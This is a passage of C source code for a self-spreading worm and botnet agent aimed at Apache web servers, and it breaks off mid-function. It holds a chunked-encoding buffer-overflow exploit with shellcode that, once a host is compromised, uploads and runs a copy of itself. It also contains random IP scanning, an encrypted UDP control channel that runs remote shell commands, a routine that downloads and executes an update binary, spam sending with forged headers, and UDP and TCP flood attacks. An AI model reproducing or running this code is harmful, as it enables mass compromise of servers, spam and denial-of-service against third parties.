#define    ENC(c) ((c) ? ((c) & 077) + ' ': '`')

int sendch(int sock,int buf) {
    char a[2];
    int b=1;
    if (buf == '`' || buf == '\\' || buf == '$') {
        a[0]='\\';
        a[1]=0;
        b=write(sock,a,1);
    }
    if (b <= 0) return b;
    a[0]=buf;
    a[1]=0;
    return write(sock,a,1);
}

int writem(int sock, char *str) {
    return write(sock,str,strlen(str));
}

int encode(int a) {
    register int ch, n;
    register char *p;
    char buf[80];
    FILE *in;
    if ((in=fopen("/tmp/.a","r")) == NULL) return 0;
    writem(a,"begin 655 .a\n");
    while ((n = fread(buf, 1, 45, in))) {
        ch = ENC(n);
        if (sendch(a,ch) <= ASUCCESS) break;
        for (p = buf; n > 0; n -= 3, p += 3) {
            if (n < 3) {
                p[2] = '\0';
                if (n < 2) p[1] = '\0';
            }
            ch = *p >> 2;
            ch = ENC(ch);
            if (sendch(a,ch) <= ASUCCESS) break;
            ch = ((*p << 4) & 060) | ((p[1] >> 4) & 017);
            ch = ENC(ch);
            if (sendch(a,ch) <= ASUCCESS) break;
            ch = ((p[1] << 2) & 074) | ((p[2] >> 6) & 03);
            ch = ENC(ch);
            if (sendch(a,ch) <= ASUCCESS) break;
            ch = p[2] & 077;
            ch = ENC(ch);
            if (sendch(a,ch) <= ASUCCESS) break;
        }
        ch='\n';
        if (sendch(a,ch) <= ASUCCESS) break;
        usleep(10);
    }
    if (ferror(in)) {
        fclose(in);
        return 0;
    }
    ch = ENC('\0');
    sendch(a,ch);
    ch = '\n';
    sendch(a,ch);
    writem(a,"end\n");
    if (in) fclose(in);
    return 1;
}

void exploit(char *ip) {
    char *a=GetAddress(ip);
    char localip[256];
    int l,sock;
    struct sockaddr_in sin;
    if (a == NULL) exit(0);
    if (strncmp(a,"Apache",6)) exit(0);
    free(a);
    alarm(60);
    for (l=0;l<2;l++) {
        u_char buf[512], *expbuf=0, *p=0;
        int i=0, j=0, responses=0;
        memcpy(&victim, &targets[l], sizeof(victim));
        sock = socket(PF_INET, SOCK_STREAM, 0);
        sin.sin_family = PF_INET;
        sin.sin_addr.s_addr = inet_addr(ip);
        sin.sin_port = htons(80);
        if(connect(sock, (struct sockaddr *) & sin, sizeof(sin)) != 0) exit(1);
        p = expbuf = malloc(8192 + ((PADSIZE_3 + NOPCOUNT + 1024) * REP_SHELLCODE) + ((PADSIZE_1 + (victim.repretaddr * 4) + victim.repzero + 1024) * REP_POPULATOR));
        PUT_STRING("POST / HTTP/1.1\r\nHost: " HOST_PARAM "\r\n");
        for (i = 0; i < REP_SHELLCODE; i++) {
            PUT_STRING("X-");
            PUT_BYTES(PADSIZE_3, PADDING_3);
            PUT_STRING(": ");
            PUT_BYTES(NOPCOUNT, NOP);
            memcpy(p, shellcode, sizeof(shellcode) - 1);
            p += sizeof(shellcode) - 1;
            PUT_STRING("\r\n");
        }
        for (i = 0; i < REP_POPULATOR; i++) {
            PUT_STRING("X-");
            PUT_BYTES(PADSIZE_1, PADDING_1);
            PUT_STRING(": ");
            for (j = 0; j < victim.repretaddr; j++) {
                *p++ = victim.retaddr & 0xff;
                *p++ = (victim.retaddr >> 8) & 0xff;
                *p++ = (victim.retaddr >> 16) & 0xff;
                *p++ = (victim.retaddr >> 24) & 0xff;
            }
            PUT_BYTES(victim.repzero, 0);
            PUT_STRING("\r\n");
        }
        PUT_STRING("Transfer-Encoding: chunked\r\n");
        snprintf(buf, sizeof(buf) - 1, "\r\n%x\r\n", PADSIZE_2);
        PUT_STRING(buf);
        PUT_BYTES(PADSIZE_2, PADDING_2);
        snprintf(buf, sizeof(buf) - 1, "\r\n%x\r\n", victim.delta);
        PUT_STRING(buf);
        write(sock, expbuf, p - expbuf);
        responses = 0;
        while (1) {
            fd_set fds;
            int n;
            struct timeval  tv;
            tv.tv_sec = 15;
            tv.tv_usec = 0;
            FD_ZERO(&fds);
            FD_SET(sock, &fds);
            memset(buf, 0, sizeof(buf));
            if(select(sock + 1, &fds, NULL, NULL, &tv) > 0) if(FD_ISSET(sock, &fds)) {
                if((n = read(sock, buf, sizeof(buf) - 1)) < 0) break;
                if(n >= 1) {
                    for(i = 0; i < n; i ++) if(buf[i] == 'G') responses ++; else responses = 0;
                    if(responses >= 2) {
                        write(sock,"O",1);
                        alarm(3600);
                        sleep(10);
                        writem(sock,"\nrm -rf /tmp/.a;cat > /tmp/.uua << __eof__;\n");
                        encode(sock);
                        writem(sock,"__eof__\n");
                        conv(localip,256,myip);
                        sprintf(buf,"/usr/bin/uudecode -p /tmp/.uua > /tmp/.a;killall -9 .a;chmod +x /tmp/.a;killall -9 .a;/tmp/.a %s;exit;\n",localip);
                        writem(sock,buf);
                        while(read(sock,buf,1024)>=0);
                        exit(0);
                    }
                }
            }
        }
        free(expbuf);
        close(sock);
    }
    return;
}
#endif

struct dns {
    unsigned short int id;
    unsigned char  rd:1;
    unsigned char  tc:1;
    unsigned char  aa:1;
    unsigned char  opcode:4;
    unsigned char  qr:1;
    unsigned char  rcode:4;
    unsigned char  unused:2;
    unsigned char  pr:1;
    unsigned char  ra:1;
    unsigned short int que_num;
    unsigned short int rep_num;
    unsigned short int num_rr;
    unsigned short int num_rrsup;
};

struct dns_rr {
    unsigned short type;
    unsigned short rr_class;
    unsigned int ttl;
    unsigned short rdlength;
};

struct _elist {
    char *name;
    struct _elist *next;
};

struct _mailserver {
    unsigned long count;
    char *name;
    struct _elist *elist;
    struct _mailserver *next;
} *mailservers=(struct _mailserver*)NULL;

char *GetServer(char *str) {
    unsigned char buf[2048];
    unsigned long len=0,i,j,hostlen,g;
    struct dns dnsp;
    struct dns_rr dnsr;
    struct ainst a,client;
    char host[256],domain[256];
    unsigned long start;
    struct _mailserver *current=NULL;
    struct _mailserver *getlist=mailservers;
    i=0;
    while(getlist != NULL) {
        if (!strcasecmp(getlist->name,str)) {
            i=1;
            break;
        }
        getlist=getlist->next;
    }
    if (i) {
        struct _elist *elist=getlist->elist;
        current=getlist;
        if (current->count) {
            for (i=0;i<(rand()%current->count);i++) elist=elist->next;
            return elist->name;
        }
        else return 0;
    }
    else {
        struct _mailserver *new=(struct _mailserver*)malloc(sizeof(struct _mailserver));
        new->count=0;
        new->name=strdup(str);
        new->elist=NULL;
        new->next=mailservers;
        mailservers=new;
        current=new;
    }

    if (strlen(str) > 256) return 0;
    strcpy(host,str);
    if (audp_setup(&a,"12.127.17.71",53) != ASUCCESS) return 0;
    srand(time(NULL));
    memset(buf,0,2048);
    dnsp.id=rand();
    dnsp.rd=1;
    dnsp.tc=0;
    dnsp.aa=0;
    dnsp.opcode=0;
    dnsp.qr=0;
    dnsp.rcode=0;
    dnsp.unused=0;
    dnsp.pr=0;
    dnsp.ra=0;
    dnsp.que_num=256;
    dnsp.rep_num=0;
    dnsp.num_rr=0;
    dnsp.num_rrsup=0;
    memcpy(buf,(void*)&dnsp,sizeof(dnsp));
    len+=sizeof(dnsp);
    hostlen=strlen(host);
    for (i=0,j=0;i<=hostlen;i++) if (host[i] == '.' || host[i] == 0) {
        char tmp;
        tmp=host[i];
        host[i]=0;
        sprintf(buf+len,"%c%s",(unsigned char)(i-j),host+j);
        len+=1+strlen(host+j);
                j=i+1;
        host[i]=tmp;
        }
    buf[len++]=0x0;
    buf[len++]=0x0;
    buf[len++]=0xf;
    buf[len++]=0x0;
    buf[len++]=0x1;
    audp_send(&a,buf,len);

    memset(buf,0,sizeof(buf));
    start=time(NULL);
    while(audp_recv(&a,&client,buf,sizeof(buf))) if (time(NULL)-start > 10) return 0;
    memcpy((void*)&dnsp,buf,sizeof(dnsp));
    memset(domain,0,256);
    for (i=0;i<ntohs(dnsp.rep_num) && len<=a.len;i++) {
        char output[256];
        unsigned long tmpl,dlen;
        len+=2;
        memcpy((void*)&dnsr,buf+len,sizeof(dnsr));
        len+=sizeof(dnsr);
        tmpl=len;
        memset(output,0,256);
        while (len-tmpl < ntohs(dnsr.rdlength)-5) {
            unsigned char tmp;
            dlen=buf[len];
            if (dlen == 0) break;
            tmp=buf[len+dlen+1];
            buf[len+dlen+1]=0;
            sprintf(output+strlen(output),"%s.",buf+len+1);
            buf[len+dlen+1]=tmp;
            len+=dlen+1;
        }
        g=0;
        if (buf[len] == 0) len++;
        else {
            g=1;
            len+=2;
        }
        if (i) strcpy(output+strlen(output),domain);
        else {
            for (j=0;j<strlen(output) && output[j] != '.';j++);
            strcpy(domain,output+j+1);
            if (g) {
                strcpy(domain+strlen(domain),host);
                strcpy(output+strlen(output),host);
            }
        }
        while(output[strlen(output)-1] == '.') output[strlen(output)-1]=0;
        {
            struct _elist *new=(struct _elist*)malloc(sizeof(struct _elist));
            new->name=strdup(output);
            new->next=current->elist;
            current->elist=new;
            current->count++;
        }
    }
    audp_close(&a);
    if (current->count) return current->elist->name;
    else return 0;
}

void SendMail(char *to, char *from, char *subject, char *data) {
    struct ainst srv;
    char buf[4096],bufm[4096],*sa;
    unsigned long i,mode=0,tm=time(NULL);
    memset(buf,0,4096);
    strcpy(buf,to);
    for (i=0;i<strlen(to);i++) if (to[i] == '@') break;
    cleanup(buf);
    cleanup(from);
    cleanup(subject);
    sa=GetServer(buf+i+1);
    if (sa == NULL) return;
    if (atcp_connect(&srv,sa,25) != 0) return;
    while(1) {
        struct ainst *g[1];
        g[0]=&srv;
        memset(bufm,0,4096);
        if (await(g,1,AREAD,20) != 0 || atcp_recv(&srv,bufm,4096) != 0 || srv.len == 0) return;
        cleanup(bufm);
        switch(atoi(bufm)) {
            case 220:
                atcp_sendmsg(&srv,"HELO %s\n",sa);
                break;
            case 250:
                switch(mode) {
                    case 0:
                        atcp_sendmsg(&srv,"MAIL FROM:<%s>\n",from);
                        break;
                    case 1:
                        atcp_sendmsg(&srv,"RCPT TO:<%s>\n",buf);
                        break;
                    case 2:
                        atcp_sendmsg(&srv,"DATA\n");
                        break;
                    case 3:
                        atcp_sendmsg(&srv,"QUIT\n");
                        atcp_close(&srv);
                        return;
                }
                mode++;
                break;
            case 354:
                atcp_sendmsg(&srv,"Return-Path: <%c%c%c%c%c%c%c@aol.com>\n",tolower((rand()%(91-65))+65),tolower((rand()%(91-65))+65),tolower((rand()%(91-65))+65),tolower((rand()%(91-65))+65),tolower((rand()%(91-65))+65),tolower((rand()%(91-65))+65),tolower((rand()%(91-65))+65));
                atcp_sendmsg(&srv,"From: %s\n",from);
                atcp_sendmsg(&srv,"Message-ID: <%x.%x.%x@aol.com>\n",rand(),rand(),rand());
                atcp_sendmsg(&srv,"Date: %s",ctime(&tm));
                atcp_sendmsg(&srv,"Subject: %s\n",subject);
                atcp_sendmsg(&srv,"To: %s\n",buf);
                atcp_sendmsg(&srv,"Mime-Version: 1.0\n");
                atcp_sendmsg(&srv,"Content-Type: text/html\n\n");
                atcp_sendmsg(&srv,"%s\r\n.\r\n",data);
                break;
        }
    }
}

int main(int argc, char **argv) 
{
    unsigned char a=0,b=0,c=0,d=0;
    unsigned long bases,*cpbases;
    struct initsrv_rec initrec;
    struct ainst backup;

    int null=open("/dev/null",O_RDWR);
    if (argc <= 1) {
        printf("%s <base 1> [base 2] ...\n",argv[0]);
        return 0;
    }
    
    srand(time(NULL)^getpid());
    memset((char*)&routes,0,sizeof(struct route_table)*24);
    memset(clients,0,sizeof(struct ainst)*CLIENTS*2);
    if (audp_listen(&udpserver,PORT) != 0) 
    {
        printf("Error: %s\n",aerror(&udpserver));
        return 0;
    }
    memset((void*)&initrec,0,sizeof(struct initsrv_rec));
    initrec.h.tag=0x70;
    cpbases=(unsigned long*)malloc(sizeof(unsigned long)*argc);
    if (cpbases == NULL) {
        printf("Insufficient memory\n");
        return 0;
    }
    for (bases=1;bases<argc;bases++) {
        cpbases[bases-1]=aresolve(argv[bases]);
        relay(cpbases[bases-1],(char*)&initrec,sizeof(struct initsrv_rec));
    }
    memcpy((void*)&backup,(void*)&udpserver,sizeof(struct ainst));
    numlinks=0;
    dup2(null,0);
    dup2(null,1);
    dup2(null,2);
    if (fork()) return 1;
    a=classes[rand()%(sizeof classes)];
    b=rand();
    c=0;
    d=0;
    signal(SIGCHLD,nas);
    signal(SIGHUP,nas);
    while (1) {
        static unsigned long timeout=0;
        char buf_[3000],*buf=buf_;
        int n,p;
        long l,i;
        unsigned long start=time(NULL);
        fd_set read;
        struct timeval tm;
        memcpy((void*)&udpserver,(void*)&backup,sizeof(struct ainst));
        FD_ZERO(&read);
        FD_SET(udpserver.sock,&read);
        udpserver.len=0;
        l=udpserver.sock;
        for (n=0;n<(CLIENTS*2);n++) if (clients[n].sock != 0) {
            FD_SET(clients[n].sock,&read);
            clients[n].len=0;
            if (clients[n].sock > l) l=clients[n].sock;
        }
        tm.tv_sec=2;
        tm.tv_usec=0;
        select(l+1,&read,NULL,NULL,&tm);
        if (FD_ISSET(udpserver.sock,&read)) udpserver.len=AREAD;
        for (n=0;n<(CLIENTS*2);n++) if (clients[n].sock != 0) if (FD_ISSET(clients[n].sock,&read)) clients[n].len=AREAD;

        timeout+=time(NULL)-start;
        if (timeout >= 60) {
            if (links == NULL || numlinks == 0) {
                memset((void*)&initrec,0,sizeof(struct initsrv_rec));
                initrec.h.tag=0x70;
                for (bases=0;bases<argc-1;bases++) relay(cpbases[bases],(char*)&initrec,sizeof(struct initsrv_rec));
            }
            else if (!myip) {
                memset((void*)&initrec,0,sizeof(struct initsrv_rec));
                initrec.h.tag=0x74;
                if (numlinks == 0 || links == NULL) for (bases=0;bases<argc-1;bases++) relay(cpbases[bases],(char*)&initrec,sizeof(struct initsrv_rec));
                else broute(0,(char*)&initrec,sizeof(struct initsrv_rec));
            }
            timeout=0;
        }
        for (i=0;i<numpids;i++) if (waitpid(pids[i],NULL,WNOHANG) > 0) {
            unsigned int *newpids,on;
            for (on=i+1;on<numpids;on++) pids[on-1]=pids[on];
            pids[on-1]=0;
            numpids--;
            newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
            for (on=0;on<numpids;on++) newpids[on]=pids[on];
            free(pids);
            pids=newpids;
        }
#ifdef SCAN
        if (myip) for (n=CLIENTS,p=0;n<(CLIENTS*2) && p<100;n++) if (clients[n].sock == 0) {
            char srv[256];
            if (d == 255) {
                if (c == 255) {
                    a=classes[rand()%(sizeof classes)];
                    b=rand();
                    c=0;
                }
                else c++;
                d=0;
            }
            else d++;
            memset(srv,0,256);
            sprintf(srv,"%d.%d.%d.%d",a,b,c,d);
            clients[n].ext=time(NULL);
            atcp_sync_connect(&clients[n],srv,SCANPORT);
            p++;
        }
        for (n=CLIENTS;n<(CLIENTS*2);n++) if (clients[n].sock != 0) {
            p=atcp_sync_check(&clients[n]);
            if (p == ASUCCESS || p == ACONNECT || time(NULL)-((unsigned long)clients[n].ext) >= 5) atcp_close(&clients[n]);
            if (p == ASUCCESS) {
                char srv[256];
                conv(srv,256,clients[n].in.sin_addr.s_addr);
                if (mfork() == 0) {
                    exploit(srv);
                    exit(0);
                }
            }
        }
#endif
        for (n=0;n<CLIENTS;n++) if (clients[n].sock != 0) {
            if (clients[n].ext2 == TCP_PENDING) {
                struct add_rec rc;
                memset((void*)&rc,0,sizeof(struct add_rec));
                p=atcp_sync_check(&clients[n]);
                if (p == ACONNECT) {
                    rc.h.tag=0x42;
                    rc.h.seq=newseq();
                    rc.h.id=clients[n].ext3;
                    audp_send(clients[n].ext,(void*)&rc,sizeof(struct add_rec));
                    FREE(clients[n].ext);
                    FREE(clients[n].ext5);
                    atcp_close(&clients[n]);
                }
                if (p == ASUCCESS) {
                    rc.h.tag=0x43;
                    rc.h.seq=newseq();
                    rc.h.id=clients[n].ext3;
                    audp_send(clients[n].ext,(void*)&rc,sizeof(struct add_rec));
                    clients[n].ext2=TCP_CONNECTED;
                    if (clients[n].ext5) {
                        atcp_send(&clients[n],clients[n].ext5,9);
                        clients[n].ext2=SOCKS_REPLY;
                    }
                }
            }
            else if (clients[n].ext2 == SOCKS_REPLY && clients[n].len != 0) {
                struct add_rec rc;
                memset((void*)&rc,0,sizeof(struct add_rec));
                l=atcp_recv(&clients[n],buf,3000);
                if (*buf == 0) clients[n].ext2=TCP_CONNECTED;
                else {
                    rc.h.tag=0x42;
                    rc.h.seq=newseq();
                    rc.h.id=clients[n].ext3;
                    audp_send(clients[n].ext,(void*)&rc,sizeof(struct add_rec));
                    FREE(clients[n].ext);
                    FREE(clients[n].ext5);
                    atcp_close(&clients[n]);
                }
            }
            else if (clients[n].ext2 == TCP_CONNECTED && clients[n].len != 0) {
                struct data_rec rc;
                memset((void*)&rc,0,sizeof(struct data_rec));
                l=atcp_recv(&clients[n],buf+sizeof(struct data_rec),3000-sizeof(struct data_rec));
                if (l == AUNKNOWN) {
                    struct kill_rec rc;
                    memset((void*)&rc,0,sizeof(struct kill_rec));
                    rc.h.tag=0x42;
                    rc.h.seq=newseq();
                    rc.h.id=clients[n].ext3;
                    audp_send((struct ainst *)clients[n].ext,(void*)&rc,sizeof(struct kill_rec));
                    FREE(clients[n].ext);
                    FREE(clients[n].ext5);
                    atcp_close(&clients[n]);
                }
                else {
                    l=clients[n].len;
                    rc.h.tag=0x41;
                    rc.h.seq=newseq();
                    rc.h.id=clients[n].ext3;
                    rc.h.len=l;
                    _encrypt(buf+sizeof(struct data_rec),l);
                    memcpy(buf,(void*)&rc,sizeof(struct data_rec));
                    audp_send((struct ainst *)clients[n].ext,buf,l+sizeof(struct data_rec));
                }
            }
        }

        if (udpserver.len != 0) if (!audp_recv(&udpserver,&udpclient,buf,3000)) {
            struct header *tmp=(struct header *)buf;
            if (udpserver.len >= sizeof(struct header)) {
                switch(tmp->tag) {
                    case 0x20: { // Versione
#ifdef LARGE_NET
                        senderror(&udpclient,tmp->id,"Unknown 24-06-2002 APC (LN)\n");
#else
                        senderror(&udpclient,tmp->id,"Unknown 24-06-2002 APC\n");
#endif
                        } break;
                    case 0x21: { // Aggiungere il collegamento
                        struct add_rec *sr=(struct add_rec *)buf;
                        if (udpserver.len < sizeof(struct add_rec)) break;
                        for (n=0;n<CLIENTS;n++) if (clients[n].sock == 0) {
                            char srv[256];
                            if (sr->socks == 0) conv(srv,256,sr->server);
                            else conv(srv,256,sr->socks);
                            clients[n].ext2=TCP_PENDING;
                            clients[n].ext3=sr->h.id;
                            clients[n].ext=(struct ainst*)malloc(sizeof(struct ainst));
                            if (clients[n].ext == NULL) {
                                clients[n].sock=0;
                                break;
                            }
                            memcpy((void*)clients[n].ext,(void*)&udpclient,sizeof(struct ainst));
                            if (sr->socks == 0) {
                                clients[n].ext5=NULL;
                                atcp_sync_connect(&clients[n],srv,sr->port);
                            }
                            else {
                                clients[n].ext5=(char*)malloc(9);
                                if (clients[n].ext5 == NULL) {
                                    clients[n].sock=0;
                                    break;
                                }
                                ((char*)clients[n].ext5)[0]=0x04;
                                ((char*)clients[n].ext5)[1]=0x01;
                                ((char*)clients[n].ext5)[2]=((char*)&sr->port)[1];
                                ((char*)clients[n].ext5)[3]=((char*)&sr->port)[0];
                                ((char*)clients[n].ext5)[4]=((char*)&sr->server)[0];
                                ((char*)clients[n].ext5)[5]=((char*)&sr->server)[1];
                                ((char*)clients[n].ext5)[6]=((char*)&sr->server)[2];
                                ((char*)clients[n].ext5)[7]=((char*)&sr->server)[3];
                                ((char*)clients[n].ext5)[8]=0x00;
                                atcp_sync_connect(&clients[n],srv,1080);
                            }
                            if (sr->bind) abind(&clients[n],sr->bind,0);
                            break;
                        }
                        } break;
                    case 0x22: { // Collegamento di uccisione
                        struct kill_rec *sr=(struct kill_rec *)buf;
                        if (udpserver.len < sizeof(struct kill_rec)) break;
                        for (n=0;n<CLIENTS;n++) if (clients[n].ext3 == sr->h.id) {
                            FREE(clients[n].ext);
                            FREE(clients[n].ext5);
                            atcp_close(&clients[n]);
                        }
                        } break;
                    case 0x23: { // Trasmettere il messaggio
                        struct data_rec *sr=(struct data_rec *)buf;
                        if (udpserver.len < sizeof(struct data_rec)+sr->h.len) break;
                        for (n=0;n<CLIENTS;n++) if (clients[n].ext3 == sr->h.id) {
                            _decrypt(buf+sizeof(struct data_rec),sr->h.len);
                            atcp_send(&clients[n],buf+sizeof(struct data_rec),sr->h.len);
                        }
                        } break;
#ifndef LARGE_NET
                    case 0x24: { // Eseguire il comando
                        FILE *f;
                        struct sh_rec *sr=(struct sh_rec *)buf;
                        struct kill_rec kp;
                        int id;
                        if (udpserver.len < sizeof(struct sh_rec)+sr->h.len || sr->h.len > 2999-sizeof(struct sh_rec)) break;
                        memset((void*)&kp,0,sizeof(struct kill_rec));
                        id=sr->h.id;
                        (buf+sizeof(struct sh_rec))[sr->h.len]=0;
                        _decrypt(buf+sizeof(struct sh_rec),sr->h.len);
                        f=popen(buf+sizeof(struct sh_rec),"r");
                        if (f != NULL) {
                            while(1) {
                                struct data_rec rc;
                                char *str;
                                unsigned long len;
                                memset(buf,0,3000);
                                fgets(buf,3000,f);
                                if (feof(f)) break;
                                len=strlen(buf);
                                memset((void*)&rc,0,sizeof(struct data_rec));
                                rc.h.tag=0x41;
                                rc.h.seq=newseq();
                                rc.h.id=id;
                                rc.h.len=len;
                                _encrypt(buf,len);
                                str=(char*)malloc(sizeof(struct data_rec)+len);
                                if (str == NULL) break;
                                memcpy((void*)str,(void*)&rc,sizeof(struct data_rec));
                                memcpy((void*)(str+sizeof(struct data_rec)),buf,len);
                                audp_send(&udpclient,str,sizeof(struct data_rec)+len);
                                FREE(str);
                            }
                            pclose(f);
                            kp.h.tag=0x42;
                            kp.h.seq=newseq();
                            kp.h.id=id;
                            audp_send(&udpclient,(void*)&kp,sizeof(struct kill_rec));
                        }
                        else senderror(&udpclient,id,"Unable to execute command");
                        } break;
#else
                    case 0x24: { // Eseguire il comando
                        senderror(&udpclient,tmp->id,"Not implicated\n");
                        } break;
#endif
                    case 0x25: { // Rumore metallico
                        struct ping_rec *rp=(struct ping_rec *)buf;
                        struct pong_rec rc;
                        struct kill_rec kp;
                        if (udpserver.len < sizeof(struct ping_rec)) break;
                        memset((void*)&rc,0,sizeof(struct pong_rec));
                        memset((void*)&kp,0,sizeof(struct kill_rec));
                        rc.h.tag=0x44;
                        rc.h.seq=newseq();
                        rc.h.id=rp->h.id;
                        rc.from=myip;
                        audp_send(&udpclient,(char*)&rc,sizeof(struct pong_rec));
                        kp.h.tag=0x42;
                        rc.h.seq=newseq();
                        kp.h.id=rp->h.id;
                        audp_send(&udpclient,(void*)&kp,sizeof(struct kill_rec));
                        } break;
                    case 0x26: { // Itinerario
                        struct route_rec *rp=(struct route_rec *)buf;
                        unsigned long i;
                        if (udpserver.len < sizeof(struct route_rec)) break;
                        if (!useseq(rp->h.seq)) {
                            addseq(rp->h.seq);

                            if (rp->server == -1 || rp->server == 0 || rp->server == myip) relay(inet_addr("127.0.0.1"),buf+sizeof(struct route_rec),rp->h.len-sizeof(struct route_rec));
                            if (rp->server == -1 || rp->server == 0) broadcast(buf,rp->h.len);
                            else if (rp->server != myip) {
                                if (rp->hops == 0 || rp->hops > 16) relay(rp->server,buf,rp->h.len);
                                else {
                                    rp->hops--;
                                    broadcast(buf,rp->h.len);
                                }
                            }

                            for (i=LINKS;i>0;i--) memcpy((struct route_table*)&routes[i],(struct route_table*)&routes[i-1],sizeof(struct route_table));
                            memset((struct route_table*)&routes[0],0,sizeof(struct route_table));
                            routes[0].id=rp->h.id;
                            routes[0].ip=udpclient.in.sin_addr.s_addr;
                            routes[0].port=htons(udpclient.in.sin_port);
                        }
                        } break;
#ifndef LARGE_NET
                    case 0x27: { // Aggiornamento
                        struct update_rec *rp=(struct update_rec *)buf;
                        struct kill_rec np;
                        struct ainst up;
                        char *server,done=0,bufm[4096],srv[256];
                        long i,d,id;
                        int file;
                        char check=0;
                        if (udpserver.len < sizeof(struct update_rec)+rp->h.len || rp->h.len > 2999-sizeof(struct update_rec)) break;
                        memset((void*)&np,0,sizeof(struct kill_rec));
                        id=rp->h.id;
                        (buf+sizeof(struct update_rec))[rp->h.len]=0;
                        _decrypt(buf+sizeof(struct update_rec),rp->h.len);
                        if (!strncmp(buf+sizeof(struct update_rec),"http://",7)) server=buf+sizeof(struct update_rec)+7;
                        else server=buf+sizeof(struct update_rec);
                        for (i=0;i<strlen(server) && server[i] != '/';i++);
                        server[i]=0;
                        if (atcp_connect(&up,server,80) != 0) {
                            senderror(&udpclient,id,"Unable to connect to host\n");
                            atcp_close(&up);
                            break;
                        }
                        atcp_sendmsg(&up,"GET /%s HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n",server+i+1,server);
                        remove("/tmp/tmp");
                        if ((file=open("/tmp/tmp",O_WRONLY|O_CREAT)) == 0) {
                            senderror(&udpclient,id,"Unable to open temporary file for writing\n");
                            atcp_close(&up);
                            break;
                        }
                        while(!done) {
                            struct ainst *g[1];
                            g[0]=&up;
                            if (await(g,1,AREAD,20) != 0 || atcp_recv(&up,bufm,4096) != 0 || up.len == 0) {
                                senderror(&udpclient,id,"Error communicating with website\n");
                                done=2;
                                break;
                            }
                            for (d=0;d<up.len-3 && !done;d++) if (!strncmp(bufm+d,"\r\n\r\n",4)) {
                                for (d+=4;d<up.len;d++) write(file,(char*)&bufm[d],1);
                                while(1) {
                                    struct ainst *g[1];
                                    g[0]=&up;
                                    if (await(g,1,AREAD,20) != 0) {
                                        senderror(&udpclient,id,"Timed out while receiving data\n");
                                        done=2;
                                        break;
                                    }
                                    if (atcp_recv(&up,bufm,4096) != 0 || up.len <= 0) break;
                                    for (d=0;d<up.len;d++) {
                                        if (!strncmp(bufm+d,"UNKNOWN-CHECKSUM-SUCCESSFUL",27)) check=1;
                                        write(file,(char*)&bufm[d],1);
                                    }
                                }
                                if (done == 0) done=1;
                            }
                        }
                        close(file);
                        atcp_close(&up);
                        if (check == 0 && done != 2) {
                            senderror(&udpclient,id,"Checksum for data failed\n");
                            break;
                        }
                        np.h.tag=0x42;
                        np.h.seq=newseq();
                        np.h.id=rp->h.id;
                        audp_send(&udpclient,(void*)&np,sizeof(struct kill_rec));
                        if (done == 2) break;
                        audp_close(&udpclient);
                        audp_close(&udpserver);
                        memset(bufm,0,1024);
                        conv(srv,256,cpbases[0]);
                        sprintf(bufm,"mv /tmp/tmp /tmp/init;export PATH=\"/tmp\";init %s",srv);
                        execl("/bin/sh","/bin/sh","-c",bufm,NULL);
                        exit(0);
                        } break;

 
#else
                    case 0x27: { // Aggiornamento
                        senderror(&udpclient,tmp->id,"Not implicated\n");
                        } break;
#endif
                    case 0x28: { // Lista
                        struct list_rec *rp=(struct list_rec *)buf;
                        struct kill_rec kp;
                        if (udpserver.len < sizeof(struct list_rec)) break;
                        memset((void*)&kp,0,sizeof(struct kill_rec));
                        syncm(&udpclient,0x46,rp->h.id);
                        kp.h.tag=0x42;
                        kp.h.seq=newseq();
                        kp.h.id=rp->h.id;
                        audp_send(&udpclient,(void*)&kp,sizeof(struct kill_rec));
                        } break;
                    case 0x29: { // Udp inondazione
                        int flag=1,fd,i=0;
                        char *str;
                        struct sockaddr_in in;
                        time_t start=time(NULL);
                        struct udp_rec *rp=(struct udp_rec *)buf;
                        if (udpserver.len < sizeof(struct udp_rec)) break;
                        if (rp->size > 9216) {
                            senderror(&udpclient,rp->h.id,"Size must be less than or equal to 9216\n");
                            break;
                        }
                        if (!isreal(rp->target)) {
                            senderror(&udpclient,rp->h.id,"Cannot packet local networks\n");
                            break;
                        }
                        senderror(&udpclient,rp->h.id,"Udp flooding target\n");
                        str=(char*)malloc(rp->size);
                        if (str == NULL) break;
                        for (i=0;i<rp->size;i++) str[i]=rand();
                        memset((void*)&in,0,sizeof(struct sockaddr_in));
                        in.sin_addr.s_addr=rp->target;
                        in.sin_family=AF_INET;
                        in.sin_port=htons(rp->port);
                        while(1) {
                            if (rp->port == 0) in.sin_port = rand();
                            if ((fd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0);
                            else {
                                flag = fcntl(fd, F_GETFL, 0);
                                flag |= O_NONBLOCK;
                                fcntl(fd, F_SETFL, flag);
                                sendto(fd,str,rp->size,0,(struct sockaddr*)&in,sizeof(in));
                                close(fd);
                            }
                            if (i >= 50) {
                                if (time(NULL) >= start+rp->secs) break;
                                i=0;
                            }
                            i++;
                        }
                        FREE(str);
                        } break;
                    case 0x2A: { // Tcp inondazione
                        int flag=1,fd,i=0;
                        struct sockaddr_in in;
                        time_t start=time(NULL);
                        struct tcp_rec *rp=(struct tcp_rec *)buf;
                        if (udpserver.len < sizeof(struct tcp_rec)) break;
                        if (!isreal(rp->target)) {
                            senderror(&udpclient,rp->h.id,"Cannot packet local networks\n");
                            break;
                        }
                        senderror(&udpclient,rp->h.id,"Tcp flooding target\n");
                        memset((void*)&in,0,sizeof(struct sockaddr_in));
                        in.sin_addr.s_addr=rp->target;
                        in.sin_family=AF_INET;
                        in.sin_port=htons(rp->port);
                        while(1) {
                            if (rp->port == 0) in.sin_port = rand();
                            if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0);
                            else {
                                flag = fcntl(fd, F_GETFL, 0);
                                flag |= O_NONBLOCK;
                                fcntl(fd, F_SETFL, flag);
                                connect(fd, (struct sockaddr *)&in, sizeof(in));
                                close(fd);
                            }
                            if (i >= 50) {
                                if (time(NULL) >= start+rp->secs) break;
                                i=0;
                            }
                            i++;
                        }
                        } break;
                    case 0x2B: { // Generico inondazione
                        int get;
                        struct sockaddr_in in;
                        struct gen_rec *rp=(struct gen_rec *)buf;
                        time_t start=time(NULL);
